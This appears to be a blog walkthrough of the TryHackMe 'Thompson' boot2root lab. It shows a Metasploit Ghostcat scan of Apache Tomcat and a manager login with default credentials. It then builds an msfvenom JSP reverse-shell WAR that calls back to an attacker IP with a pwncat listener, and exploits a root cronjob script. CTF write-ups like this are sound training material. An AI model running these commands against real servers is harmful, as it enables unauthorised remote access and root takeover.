---
title: Walkthrough - Thompson
published: true
---

Security, Apache Tomcat. Boot2root machine for FIT and bsides guatemala CTF.

[https://tryhackme.com/room/bsidesgtthompson](https://tryhackme.com/room/bsidesgtthompson)

* * *

## Notes

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
```

```
msf6 auxiliary(admin/http/tomcat_ghostcat) > run
[*] Running module against 10.10.48.147
Status Code: 200
Accept-Ranges: bytes
ETag: W/"1227-1472673232000"
Last-Modified: Wed, 31 Aug 2016 19:53:52 GMT
Content-Type: application/xml
Content-Length: 1227
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

- `gobuster dir -u http://10.10.48.147:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 --no-error -x txt,php,html`

checking out `/manager/` we get a login screen, trying creds there doesnt work but clicking cancel give us a hint. 
- `<user username="tomcat" password="s3cret" roles="manager-gui"/>` we can use these to login.

Now that we have access we can upload a java .war shell and setup a `pwncat` listener to recieve it

- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.2.127.225 LPORT=6969 -f war -o shell.war`
- `pwncat-cs -lp 6969`

![0xskar](/assets/thompson01.png)

* * * 

## What is the user flag?

![0xskar](/assets/thompson02.png)

* * * 

## What is the root flag?

- root is running a cronjob `*  *    * * *   root    cd /home/jack && bash id.sh`

- `id.sh`

```
#!/bin/bash
id > test.txt
```

this script is just running id but it isnt using the intire path to id so if we create another script called id we can open up a root shell

![0xskar](/assets/thompson03.png)

* * * 

